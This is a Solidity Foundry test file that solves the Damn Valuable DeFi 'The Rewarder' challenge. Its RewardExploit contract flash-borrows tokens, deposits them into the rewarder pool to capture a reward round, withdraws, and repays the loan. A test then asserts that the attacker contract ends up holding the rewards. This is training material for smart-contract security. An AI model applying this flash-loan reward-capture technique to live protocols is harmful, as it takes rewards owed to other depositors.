// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Test.sol";
import "forge-std/console.sol";
import {TheRewarderPool} from "../../src/rewarder/TheRewarderPool.sol";
import {FlashLoanerPool} from "../../src/rewarder/FlashLoanerPool.sol";
import {RewardToken} from "../../src/rewarder/RewardToken.sol";
import {DamnValuableToken} from "../../src/DamnValuableToken.sol";

interface IDamnValuableToken {
    function transfer(address, uint256) external returns (bool);

    function balanceOf(address) external view returns (uint256);

    function approve(address, uint256) external returns (bool);
}

interface IFlashLoanerPool {
    function flashLoan(uint256 amount) external;
}

interface ITheRewarderPool {
    function deposit(uint256 amount) external;

    function withdraw(uint256 amount) external;

    function distributeRewards() external returns (uint256 rewards);
}

contract RewardExploit {
    uint256 FLASHLOAN_BALANCE = 10_000e18;

    address flashLoanerPool;
    address rewarderPool;
    address liquidityToken;

    constructor(
        address _flashLoanerPool,
        address _rewarderPool,
        address _liquidityToken
    ) {
        flashLoanerPool = _flashLoanerPool;
        rewarderPool = _rewarderPool;
        liquidityToken = _liquidityToken;
    }

    function exploit(uint256 amount) external {
        IFlashLoanerPool(flashLoanerPool).flashLoan(amount);
    }

    function receiveFlashLoan(uint256 amount) external {
        IDamnValuableToken(liquidityToken).approve(
            address(rewarderPool),
            amount
        );
        ITheRewarderPool(rewarderPool).deposit(amount);
        // ITheRewarderPool(rewarderPool).distributeRewards();
        ITheRewarderPool(rewarderPool).withdraw(amount);

        IDamnValuableToken(liquidityToken).transfer(
            address(flashLoanerPool),
            amount
        );
    }

    function distributeRewards() external returns (uint256 rewards) {
        ITheRewarderPool(rewarderPool).distributeRewards();
    }
}

contract RewarderTest is Test {
    uint256 FLASHLOAN_BALANCE = 10_000e18;
    TheRewarderPool pool;
    FlashLoanerPool flashLoanerPool;
    DamnValuableToken liquidityToken;
    RewardToken rewardToken;
    RewardExploit rewardExploit;

    address alice;
    address bob;
    address charlie;
    address david;

    // uint256 TOKEN_BALANCE = 1_000_000e18; // 1 million DVT

    function setUp() public {
        alice = makeAddr("alice");
        bob = makeAddr("bob");
        charlie = makeAddr("charlie");
        david = makeAddr("david");

        liquidityToken = new DamnValuableToken();
        pool = new TheRewarderPool(address(liquidityToken));
        flashLoanerPool = new FlashLoanerPool(address(liquidityToken));
        rewardExploit = new RewardExploit(
            address(flashLoanerPool),
            address(pool),
            address(liquidityToken)
        );

        address[4] memory users = [alice, bob, charlie, david];

        for (uint256 i; i <= 3; i++) {
            liquidityToken.transfer(users[i], 100 ether);
            vm.startPrank(users[i]);
            liquidityToken.approve(address(pool), 100 ether);
            pool.deposit(100 ether);
            vm.stopPrank();
        }
        assertEq(pool.accountingToken().totalSupply(), 400 ether);
        assertEq(pool.roundNumber(), 1);

        vm.warp(6 days);
        assertEq(pool.isNewRewardsRound(), true);

        for (uint256 i; i <= 3; i++) {
            vm.startPrank(users[i]);
            pool.distributeRewards();
            vm.stopPrank();
            assertEq(pool.rewardToken().balanceOf(users[i]), 25 ether);
            assertEq(pool.rewardToken().totalSupply(), (i + 1) * 25 ether);
        }

        liquidityToken.transfer(address(flashLoanerPool), FLASHLOAN_BALANCE);
        assertEq(pool.roundNumber(), 2);
    }

    function testExploitRewarder() public {
        vm.warp(10 days);
        assertEq(pool.isNewRewardsRound(), true);

        rewardExploit.exploit(FLASHLOAN_BALANCE);

        validation();
    }

    function validation() public {
        // Get total rewards this far
        uint256 totalSuply;
        address[4] memory users = [alice, bob, charlie, david];
        for (uint256 i; i <= 3; i++) {
            totalSuply += pool.rewardToken().balanceOf(address(users[i]));
        }
        // attacker has the balance of the latest round
        assertEq(
            pool.rewardToken().balanceOf(address(rewardExploit)) + totalSuply,
            pool.rewardToken().totalSupply()
        );
    }
}
